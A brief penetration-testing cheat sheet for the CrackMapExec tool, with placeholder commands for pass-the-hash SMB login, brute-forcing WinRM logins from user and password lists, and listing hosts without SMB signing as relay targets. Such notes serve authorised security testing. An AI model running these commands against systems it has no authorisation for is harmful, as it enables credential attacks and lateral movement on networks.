### source
https://github.com/byt3bl33d3r/CrackMapExec  

### authenticate via smb using hash
```
crackmapexec smb <rhost> -u <user> -H <hash>
```

### bruteforce winrm login
```
crackmapexec winrm <rhost> -u <userFile> -p <passwordFile>
```

### list of servers with SMB signing flag
```
crackmapexec smb <rhost>/24 --gen-relay-list
```
